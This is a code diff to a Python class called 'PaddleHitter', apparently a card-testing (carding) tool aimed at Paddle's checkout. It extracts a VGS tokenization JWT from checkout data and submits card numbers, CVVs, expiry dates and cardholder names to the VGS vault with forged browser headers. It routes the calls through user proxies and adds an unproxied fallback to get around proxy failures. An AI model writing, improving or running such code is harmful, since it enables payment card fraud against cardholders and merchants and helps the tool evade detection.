@@ -206,10 +206,11 @@ class PaddleHitter:
                         # Extract VGS JWT from payment methods
                         methods = init_json.get('payments', {}).get('methods_available', [])
                         for m in methods:
-                            if m.get('tokenization_provider') == 'vgs':
-                                vgs_opts = m.get('vgs_options', {})
-                                cfg['vgs_jwt'] = vgs_opts.get('jwt')
-                                break
+                            if m.get('tokenization_provider') == 'vgs' or m.get('type') in ('CARD', 'card'):
+                                vgs_opts = m.get('vgs_options') or m.get('options')
+                                if isinstance(vgs_opts, dict) and vgs_opts.get('jwt'):
+                                    cfg['vgs_jwt'] = vgs_opts.get('jwt')
+                                    break
             except Exception:
                 pass
 
@@ -370,33 +371,45 @@ class PaddleHitter:
                     card_id = None
                     vgs_jwt = cfg.get('vgs_jwt')
                     if vgs_jwt:
-                        try:
-                            vgs_hdr = {
-                                "Authorization": f"Bearer {vgs_jwt}",
-                                "Content-Type": "application/vnd.api+json",
-                                "Accept": "application/vnd.api+json",
-                                "User-Agent": UA,
-                                "Origin": "https://buy.paddle.com",
-                                "Referer": "https://buy.paddle.com/",
-                            }
-                            vgs_payload = {
-                                "data": {
-                                    "type": "cards",
-                                    "attributes": {
-                                        "pan": clean_card,
-                                        "cvc": str(card.get('cvv', '')),
-                                        "exp_month": exp_month_int,
-                                        "exp_year": exp_year_int % 100,  # 2-digit year
-                                        "cardholder": {"name": shopper['full_name']}
-                                    }
+                        vgs_hdr = {
+                            "Authorization": f"Bearer {vgs_jwt}",
+                            "Content-Type": "application/vnd.api+json",
+                            "Accept": "application/vnd.api+json",
+                            "User-Agent": UA,
+                            "Origin": "https://buy.paddle.com",
+                            "Referer": "https://buy.paddle.com/",
+                        }
+                        vgs_payload = {
+                            "data": {
+                                "type": "cards",
+                                "attributes": {
+                                    "pan": clean_card,
+                                    "cvc": str(card.get('cvv', '')),
+                                    "exp_month": exp_month_int,
+                                    "exp_year": exp_year_int % 100,  # 2-digit year
+                                    "cardholder": {"name": shopper['full_name']}
                                 }
                             }
-                            async with sess.post("https://vgsapi.com/cards", json=vgs_payload, headers=vgs_hdr, timeout=10) as r_vgs:
+                        }
+                        # 1. Try tokenizing via current session (with proxy)
+                        try:
+                            async with sess.post("https://vgsapi.com/cards", json=vgs_payload, headers=vgs_hdr, timeout=7) as r_vgs:
                                 if r_vgs.status_code in (200, 201):
                                     vgs_data = r_vgs.json()
                                     card_id = vgs_data.get('data', {}).get('id')
                         except Exception:
                             pass
+
+                        # 2. Fallback: direct unproxied vault call if user proxy dropped or timed out
+                        if not card_id:
+                            try:
+                                async with ChromeSession(impersonate="chrome131", timeout=8) as direct_sess:
+                                    async with direct_sess.post("https://vgsapi.com/cards", json=vgs_payload, headers=vgs_hdr) as r_vgs2:
+                                        if r_vgs2.status_code in (200, 201):
+                                            vgs_data2 = r_vgs2.json()
+                                            card_id = vgs_data2.get('data', {}).get('id')
+                            except Exception:
+                                pass
 
                     if not card_id:
                         result['response_time'] = round(time.time() - t0, 2)
